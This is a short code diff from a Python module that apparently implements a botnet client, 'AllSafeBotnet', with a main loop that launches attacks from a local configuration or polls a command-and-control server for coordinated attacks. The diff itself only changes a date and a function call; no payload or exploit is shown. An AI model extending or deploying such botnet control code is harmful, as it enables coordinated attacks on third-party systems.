@@ -3,7 +3,7 @@ This is the module handling the AllSafeBotnet operations and
 interfaces to the control panel.
 
 Created:    17 January 2017
-Modified:   17 January 2017
+Modified:   09 February 2017
 """
 
 from multiprocessing import Process, Queue
@@ -74,7 +74,7 @@ class AllSafeBotnet():
         while True:
             # override mode -> local configuration!
             if override:
-                id, resources, counter = self.attack(configuration, override=True)
+                self.attack(configuration, override=True)
             # periodically check for C&C to carry a coordinated attack
             else:
                 up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + str(self._attack_counter) + "executing")
